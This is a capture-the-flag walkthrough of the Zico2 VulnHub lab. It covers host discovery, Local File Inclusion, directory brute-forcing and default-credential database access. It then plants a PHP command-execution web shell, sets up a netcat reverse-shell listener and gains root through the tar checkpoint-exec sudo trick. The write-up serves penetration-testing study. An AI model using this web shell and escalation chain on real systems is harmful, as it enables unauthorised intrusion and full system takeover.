# Zico2 VulnHub Walkthrough

---

# Reconnaissance

First, I used `netdiscover` to identify active hosts on the network and found the IP address of the target machine.

```bash
netdiscover
```

After identifying the target, I performed an Nmap scan to enumerate open ports and services.

```bash
nmap -sV -sC 192.168.71.133
```

The scan revealed that port `80` was open, indicating a web server was running.

---

# Web Enumeration

Next, I opened the target IP address in the browser:

```text
http://192.168.71.133
```

While exploring the website, I found a button labeled **Check**. After clicking it, I noticed that the URL changed and appeared to be vulnerable to **Local File Inclusion (LFI)**.

To verify the vulnerability, I attempted to access the system password file:

```text
/etc/passwd
```

The LFI vulnerability was successfully confirmed.

---

# Directory Bruteforcing

After confirming the vulnerability, I used `Gobuster` to brute-force directories and files on the web server.

```bash
gobuster dir -u http://192.168.71.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

During enumeration, I discovered several routes, including:

```text
/dbadmin
```

When I visited this route, it exposed a database administration page called:

```text
test_db.php
```

---

# Database Admin Access

I attempted to log in using the default credentials:

```text
Password: admin
```

The login was successful.

Inside the panel, I discovered that I could create a database file. I created a file named:

```text
hack.php
```

Then, I created a table and row where I inserted a PHP backdoor that accepted a `cmd` parameter.



```php
<?php system($_GET['cmd']); ?>
```

This allowed me to execute system commands remotely through the browser.

---

# Reverse Shell

On my attacker machine (`192.168.71.132`), I started a Netcat listener on port `4444`.

```bash
nc -lvnp 4444
```

Next, I returned to the target website and used the `cmd` parameter in the URL to execute a reverse shell payload that connected back to my attacker machine.


After executing the payload successfully, I received a reverse shell as the `www-data` user.

---

# Privilege Escalation to Zico

After gaining shell access, I searched the system for useful configuration files and found the `wp-config.php` file.

Inside the file, I discovered credentials that allowed me to switch to the `zico` user.

Before switching users, I upgraded the shell into a fully interactive TTY shell using Python PTY.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then, I switched to the `zico` user.

```bash
su zico
```

---

# Privilege Escalation to Root

After further enumeration, I checked the sudo permissions for the `zico` user.

```bash
sudo -l
```

I discovered that the user could execute two commands with sudo privileges without requiring a password.

One of the allowed binaries was `tar`.

I searched for `tar` privilege escalation techniques on GTFOBins and used the following command to spawn a root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This successfully provided a root shell.

---

# Capture the Flag

Finally, after obtaining root access, I navigated to the `/root` directory and retrieved the flag.

```bash
cd /root
ls
cat flag.txt
```

---

# Attack Path Summary

1. Host discovery using Netdiscover
2. Port scanning with Nmap
3. Web enumeration
4. Exploiting Local File Inclusion (LFI)
5. Directory bruteforcing with Gobuster
6. Accessing `/dbadmin`
7. Logging in with default credentials
8. Creating a PHP backdoor
9. Gaining a reverse shell as `www-data`
10. Extracting credentials from `wp-config.php`
11. Upgrading the shell with Python PTY
12. Switching to the `zico` user
13. Exploiting `tar` sudo privileges using GTFOBins
14. Escalating privileges to root
15. Capturing the root flag

---



---

# Disclaimer

This walkthrough was performed in a legal lab environment for educational and ethical hacking purposes only.
